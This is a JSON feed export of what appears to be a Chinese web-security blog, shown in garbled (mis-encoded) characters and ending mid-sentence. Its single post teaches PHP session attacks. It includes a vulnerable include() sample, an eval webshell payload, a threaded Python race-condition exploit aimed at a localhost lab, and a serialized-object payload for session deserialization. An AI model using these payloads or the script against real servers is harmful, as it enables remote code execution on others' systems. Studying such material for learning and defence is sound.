{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog",
    "description": "ä¸å®šæ—¶æ›´æ–°webå®‰å…¨ç›¸å…³çŸ¥è¯†",
    "home_page_url": "https://hq185187.github.io",
    "items": [
        {
            "id": "https://hq185187.github.io/2023/07/01/session%E5%AE%89%E5%85%A8/",
            "url": "https://hq185187.github.io/2023/07/01/session%E5%AE%89%E5%85%A8/",
            "title": "sessionå®‰å…¨",
            "date_published": "2023-07-01T06:51:21.100Z",
            "content_html": "<h2 id=\"ä¸€sessionæ–‡ä»¶åŒ…å«\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€sessionæ–‡ä»¶åŒ…å«\">#</a> ä¸€.session æ–‡ä»¶åŒ…å«</h2>\n<h3 id=\"å‰ç½®çŸ¥è¯†\"><a class=\"markdownIt-Anchor\" href=\"#å‰ç½®çŸ¥è¯†\">#</a> å‰ç½®çŸ¥è¯†</h3>\n<ol>\n<li>session.upload_progress æ˜¯ PHP5.4 æ·»åŠ çš„ï¼Œæ‰€ä»¥ PHP ç‰ˆæœ¬è¦ &gt; 5.4</li>\n<li>ä»€ä¹ˆæ˜¯ session.upload_progress? å¯ä»¥ç†è§£ä¸ºæ–‡ä»¶ä¸Šä¼ è¿›åº¦ï¼Œå°±æ˜¯å½“ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¦‚æœæˆ‘ä»¬åŒæ—¶ POST ä¸€ä¸ªä¸ session.upload_progress.name åŒåçš„å˜é‡ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨ <code>$_session</code>  é‡Œè·å¾— (ä¹Ÿå°±æ˜¯é‚£ä¸ª session æ–‡ä»¶é‡Œ),PHP ä¼šåœ¨ <code>$_session</code>  é‡Œåˆ›å»ºä¸€ä¸ªç´¢å¼•æ˜¯ session.upload_progress.prefix å’Œ session.upload_progress.name è¿æ¥ä¸€èµ·çš„å€¼<br>\n<mark>é‡ç‚¹</mark>:<br>\n å‡è®¾æˆ‘è®¾ç½®:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, </span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶åœ¨ sess_TGAO é‡Œçš„æ–‡ä»¶å†…å®¹å°±æœ‰ <code>upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</code> , æ­¤æ—¶å°±å¯ä»¥é…åˆæ–‡ä»¶åŒ…å«æ¼æ´æ¥ rce äº†</p>\n<ol start=\"3\">\n<li>å‡ ä¸ªé»˜è®¤å‚æ•°</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.session.upload_progress.enabled=on</span><br><span class=\"line\">2. session.upload_progress.cleanup = on  </span><br><span class=\"line\">3. session.upload_progress.prefix = &quot;upload_progress_&quot;  </span><br><span class=\"line\">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;  </span><br><span class=\"line\">5. session.upload_progress.freq = &quot;1%&quot;  </span><br><span class=\"line\">6. session.upload_progress.min_freq = &quot;1&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">`enabled=on`è¡¨ç¤º`upload_progress`åŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼›</span><br><span class=\"line\"></span><br><span class=\"line\">`cleanup=on`è¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦ï¼›</span><br><span class=\"line\"></span><br><span class=\"line\">`name`å½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼›</span><br><span class=\"line\"></span><br><span class=\"line\">`prefix+name`å°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å</span><br></pre></td></tr></table></figure>\n<h3 id=\"æ–‡ä»¶åŒ…å«åˆ©ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#æ–‡ä»¶åŒ…å«åˆ©ç”¨\">#</a> æ–‡ä»¶åŒ…å«åˆ©ç”¨</h3>\n<p>ç¤ºä¾‹ä»£ç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"variable\">$b</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>æˆ‘ä»¬æ²¡æœ‰å¯ä»¥åŒ…å«çš„æ¶æ„æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨ session.upload_progress å°†æ¶æ„è¯­å¥å†™å…¥ session, å†åŒ…å« session æ–‡ä»¶ï¼Œä½†æ˜¯ä¸çŸ¥é“ session æ–‡ä»¶çš„å­˜æ”¾ä½ç½®</p>\n<p>åˆ†æ:<br>\n1. æ€ä¹ˆå¼€å¯ session_start ()?</p>\n<ul>\n<li>å¦‚æœ session.auto_start=On, åˆ™ PHP åœ¨æ¥æ”¶è¯·æ±‚æ—¶ä¼šè‡ªåŠ¨åˆå§‹åŒ– session, ä¸éœ€è¦å†æ‰§è¡Œ session_start (), ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯å…³é—­çš„</li>\n<li>session.use_strict_mode é»˜è®¤æ˜¯ 0, æ­¤æ—¶ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ Seesion ID çš„ã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨ Cookie é‡Œè®¾ç½® PHPSESSID=TT,PHP å°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶:/tmp/sess_TT å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ– Sessionï¼ŒPHP ä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ– Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ ini.get (â€œsession.upload_progress.prefixâ€)+ ç”±æˆ‘ä»¬æ„é€ çš„ session.upload_progress.name å€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥ sess_æ–‡ä»¶é‡Œã€‚<br>\n2. é»˜è®¤é…ç½® session.upload_progress.cleanup=On å¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsession æ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œæ€ä¹ˆè¿›è¡Œ rce?â€“æ¡ä»¶ç«äº‰</li>\n</ul>\n<p>è„šæœ¬ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> io  </span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\"><span class=\"keyword\">import</span> threading  </span><br><span class=\"line\">  </span><br><span class=\"line\">sessid = <span class=\"string\">&#x27;TGAO&#x27;</span>  </span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;cmd&quot;</span>: <span class=\"string\">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">        f = io.BytesIO(<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">1024</span> * <span class=\"number\">50</span>)  </span><br><span class=\"line\">        resp = session.post(<span class=\"string\">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>,  </span><br><span class=\"line\">                            data=&#123;<span class=\"string\">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class=\"string\">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,  </span><br><span class=\"line\">                            files=&#123;<span class=\"string\">&#x27;file&#x27;</span>: (<span class=\"string\">&#x27;tgao.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class=\"string\">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read</span>(<span class=\"params\">session</span>):  </span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\">        resp = session.post(<span class=\"string\">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span> + sessid, data=data)  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;tgao.txt&#x27;</span> <span class=\"keyword\">in</span> resp.text:  </span><br><span class=\"line\">            <span class=\"built_in\">print</span>(resp.text)  </span><br><span class=\"line\">            event.clear()  </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:  </span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+++++++++++++]retry&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:  </span><br><span class=\"line\">    event = threading.Event()  </span><br><span class=\"line\">    <span class=\"keyword\">with</span> requests.session() <span class=\"keyword\">as</span> session:  </span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">1</span>, <span class=\"number\">30</span>):  </span><br><span class=\"line\">            threading.Thread(target=write, args=(session,)).start()  </span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">1</span>, <span class=\"number\">30</span>):  </span><br><span class=\"line\">            threading.Thread(target=read, args=(session,)).start()  </span><br><span class=\"line\">    event.<span class=\"built_in\">set</span>()</span><br></pre></td></tr></table></figure>\n<p>è¿‡ç¨‹:<br>\n æ­¤è„šæœ¬çš„æ„æ€æ˜¯å…ˆåˆ©ç”¨ write å‡½æ•°ï¼Œä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ tgao.txt, å‘é€ post è¯·æ±‚å†™ shell åˆ° session æ–‡ä»¶é‡Œ ( <code>upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</code> ), ç„¶ååœ¨è¿›è¡Œè¯»å– session é‡Œçš„æ‰§è¡Œæ¶æ„å‘½ä»¤çš„ç»“æœ (whoami), æ­¤æ—¶ä¼šå…ˆåˆ¤æ–­å®ƒçš„ä¸Šä¼ è¿‡ç¨‹ä¿¡æ¯æ–‡ä»¶é‡Œæ˜¯å¦æœ‰ tgao.txt, æ¥ç¡®å®šæ˜¯å¦ write å‡½æ•°æˆåŠŸå†™ shell, æˆ–è€…è¿˜æ²¡è¢«åˆ é™¤ï¼Œå¦‚æœæœ‰ tgao.txt å† print å‡ºæ‰§è¡Œæ¶æ„å‘½ä»¤çš„ç»“æœ</p>\n<p><mark>æ³¨æ„:</mark><br>\n è¿™ä¸ª session æ–‡ä»¶çš„æ ¼å¼å¤§æ¦‚æ˜¯è¿™æ ·çš„:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;|a:5:&#123;s:10:&quot;start_time&quot;;i:1688050992;s:14:&quot;content_length&quot;;i:51480;s:15:&quot;bytes_processed&quot;;i:5254;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:8:&quot;tgao.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1688050992;s:15:&quot;bytes_processed&quot;;i:0;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥å‘ç°æ³¨å…¥ç‚¹è¿˜å¯ä»¥åœ¨æ–‡ä»¶å filename å¤„ (æ­¤å¤„å¯ä»¥æ„é€  session ååºåˆ—åŒ–æ¼æ´)</p>\n<h2 id=\"äºŒsessionååºåˆ—åŒ–\"><a class=\"markdownIt-Anchor\" href=\"#äºŒsessionååºåˆ—åŒ–\">#</a> äºŒ.session ååºåˆ—åŒ–</h2>\n<p>session åŸç†æµç¨‹ï¼š<br>\n<img data-src=\"https://image.3001.net/images/20220311/1646988659_622b0d7380818dab56a63.png\" alt=\"\"></p>\n<h3 id=\"php-sessionåºåˆ—åŒ–æœºåˆ¶\"><a class=\"markdownIt-Anchor\" href=\"#php-sessionåºåˆ—åŒ–æœºåˆ¶\">#</a> PHP session åºåˆ—åŒ–æœºåˆ¶:</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">å¤„ç†å™¨</th>\n<th style=\"text-align:center\">å¯¹åº”çš„å­˜å‚¨æ ¼å¼</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">php</td>\n<td style=\"text-align:center\">é”®å + ç«–çº¿ + ç»è¿‡ serializeï¼ˆï¼‰ å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">php_binary</td>\n<td style=\"text-align:center\">é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡ serializeï¼ˆï¼‰ å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">php_serialize(php&gt;=5.54)</td>\n<td style=\"text-align:center\">ç»è¿‡ serializeï¼ˆï¼‰ å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"phpå¤„ç†å™¨\"><a class=\"markdownIt-Anchor\" href=\"#phpå¤„ç†å™¨\">#</a> php å¤„ç†å™¨</h4>\n<p>æ¥ä¸‹æ¥ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬åˆ†æå®ƒçš„è¿‡ç¨‹ï¼Œï¼š<br>\nä»£ç æ˜¯ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;session.serialize_handler&#x27;</span>,<span class=\"string\">&#x27;php&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\">//è¿™é‡Œä»¥phpå¤„ç†å™¨ä¸ºä¾‹</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>] = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶æˆ‘ä»¬ url ä¸ºï¼Ÿname=hhaa<br>\n è¿‡ç¨‹ï¼š</p>\n<ol>\n<li>äº§ç”Ÿæ–°çš„ PHPSESSIDï¼ˆ8pj72deu5v3c6d8i7t7qlpnqd5ï¼‰ï¼Œåˆå§‹åŒ– <code>$_SESSION</code> , ä½¿ç”¨ <code>$_SESSION</code>  å­˜å‚¨æ•°æ®</li>\n<li>å°† <code>$_SESSION</code>  å­˜å‚¨çš„æ•°æ®åºåˆ—åŒ–å­˜å‚¨ä¸º PHPSESSID æ–‡ä»¶ï¼ˆä¹Ÿå°±æ˜¯ sess_PHPESEEID æ–‡ä»¶ï¼‰</li>\n<li>å°†åŒ…å« PHPSESSID å€¼çš„ cookie é€šè¿‡å“åº”å¤´è¿”å›æµè§ˆå™¨<br>\næ­¤æ—¶çš„æ–‡ä»¶åä¸º <code>sess_8pj72deu5v3c6d8i7t7qlpnqd5</code> , æ–‡ä»¶å†…å®¹æ˜¯:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name|s:4:&quot;hhaa&quot;;</span><br></pre></td></tr></table></figure>\n<p>æ ¼å¼æ˜¯é”®å ( <code>$_SESSION['name']</code>  çš„é”®å name)+ ç«–çº¿ (|)+ ç»è¿‡ serialize () å‡½æ•°ååºåˆ—åŒ–å¤„ç†çš„å€¼ (s:4:â€œhhaaâ€ğŸ˜‰</p>\n<p>å…·ä½“å›¾ç‰‡:<br>\n<img data-src=\"https://s2.loli.net/2023/06/30/6kxeBtsO8KIAPFV.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-30 233321.png\"></p>\n<h4 id=\"php_binaryå¤„ç†å™¨\"><a class=\"markdownIt-Anchor\" href=\"#php_binaryå¤„ç†å™¨\">#</a> php_binary å¤„ç†å™¨</h4>\n<p>ä»£ç :</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;session.serialize_handler&#x27;</span>,<span class=\"string\">&#x27;php_binary&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä¸ºäº†æ–¹ä¾¿ACSIIæ˜¾ç¤ºï¼Œå°†é”®åè®¾ç½®ä¸º36ä¸ªå­—ç¬¦é•¿åº¦</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ä¸‰ç§æ–¹å¼çš„æ–‡ä»¶å‘½åæ–¹å¼ä¸€æ ·çš„ï¼Œæ­¤æ—¶çš„æ–‡ä»¶å†…å®¹:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$namenamenamenamenamenamenamenamenames:4:&quot;hhaa&quot;;</span><br></pre></td></tr></table></figure>\n<p>å­˜å‚¨æ ¼å¼ä¸ºï¼šé”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ( <code>$</code> )+ é”®å (namenamenamenamenamenamenamenamename)+ ç»è¿‡ serialize () å‡½æ•°ååºåˆ—åŒ–åçš„å€¼ (s:4:â€œhhaaâ€ğŸ˜‰</p>\n<p>å›¾ç‰‡:<br>\n<img data-src=\"https://s2.loli.net/2023/07/01/kQg2rj7W5UBJMbS.png\" alt=\"å±å¹•æˆªå›¾ 2023-06-30 235836.png\"></p>\n<h4 id=\"php_serializeå¤„ç†å™¨\"><a class=\"markdownIt-Anchor\" href=\"#php_serializeå¤„ç†å™¨\">#</a> php_serialize å¤„ç†å™¨</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;session.serialize_handler&#x27;</span>,<span class=\"string\">&#x27;php_serialize&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>] = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶çš„æ–‡ä»¶å†…å®¹æ˜¯:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:1:&#123;s:4:&quot;name&quot;;s:4:&quot;hhaa&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨\">#</a> ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</h3>\n<p>session çš„ååºåˆ—åŒ–æ¼æ´ï¼Œå°±æ˜¯åˆ©ç”¨ <code>php</code>  å¤„ç†å™¨å’Œ <code>php_serialize</code>  å¤„ç†å™¨çš„å­˜å‚¨æ ¼å¼å·®å¼‚è€Œäº§ç”Ÿ</p>\n<p>test.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\">class f4ke&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  public $name;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  function __wakeup()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  echo &quot;Who are you?&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  function __destruct()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  eval($this-&gt;name);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$str = new f4ke();</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>test1.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">echo $_SESSION[&#x27;session&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>é¦–å…ˆåœ¨ test1.php é‡Œæ„å»º session:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?session=|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶çš„ sess_PHPSESSID æ–‡ä»¶å†…å®¹:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:1:&#123;s:7:&quot;session&quot;;s:45:&quot;|O:4:&quot;f4ke&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>æµè§ˆå™¨ä¿å­˜çš„ PHPSESSID æ–‡ä»¶åæ˜¯ä¸å˜çš„ï¼Œå½“æˆ‘ä»¬è®¿é—® test.php æ—¶ (è¿™ä¸ªæ–‡ä»¶é»˜è®¤æ˜¯ php å¤„ç†å™¨), æ ¹æ®ä¸Šé¢çš„ session åŸç†æµç¨‹å›¾å¯çŸ¥:</p>\n<ol>\n<li>è·å– PHPSESSID</li>\n<li>åˆå§‹åŒ– 